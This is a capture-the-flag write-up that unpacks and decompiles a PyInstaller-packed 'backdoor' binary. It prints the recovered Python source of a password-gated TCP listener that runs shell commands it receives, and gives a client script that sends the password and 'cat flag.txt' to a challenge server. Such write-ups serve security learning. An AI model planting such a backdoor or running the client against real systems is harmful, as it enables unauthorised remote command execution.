**Description**: One of our friends has left a backdoor on the extraterrestrialsâ€™ server. If we manage to take advantage of it, we will be able to control all the doors and lock them outside or open doors to facilities we have no access.

**Stars**: 2/5

**Downloadable**:
bd - ELF binary

**Goal**: Analyze the backdoor and see how to exploit it

**Solution**: 

After quick check bd turns out to be a pyinstaller packed binary (if you don't know how to check it, look for the strings like `_PYI_PROCNAME` or `_MEIPASS2` in the binary).

We can unpack it with pyinstxtractor: https://github.com/extremecoders-re/pyinstxtractor

After unpacking we will get a bd.pyc file that we still need to decompile to python code. I used uncompyle6 for this: https://pypi.org/project/uncompyle6/

At this point we end up with following python code:

```python
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
        client.send(b'Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith(b'command:'):
            client.close()
        else:
            command = command.replace(b'command:', b'')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
```

It looks like we need to send 3 specific packets. First one a binary string `s4v3_th3_w0rld` then the length of next command, and a linux command with a prefix `command:`

Following code gave me the flag:

```python
import socket
import sys
import select
from hashlib import md5

def main():
    server_address = ('188.166.145.178',30607)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('connecting to %s port %s' % server_address, file=sys.stderr)
    sock.connect(server_address)
    msg = md5(b's4v3_th3_w0rld').hexdigest()
    print("Sending: " + msg)
    socket_send(sock,(msg).encode())
    msg = 'command:cat flag.txt'
    msg_len = len(msg)
    print("Sending: " + str(msg_len))
    socket_send(sock,bytes([msg_len]))
    print("Sending: " + msg)
    socket_send(sock,msg.encode())
    data = socket_receive(sock)
    print(data.decode())


def socket_receive(sock):
    data = b''
    try:
        amount_expected = 4096
        ready = select.select([sock], [], [], 2)
        data = sock.recv(amount_expected)
    finally:
        return data

def socket_send(sock, data):
    try:
        sock.send(data)
    except:
        print("Couldn't send data")


if __name__ == "__main__":
    main()
```
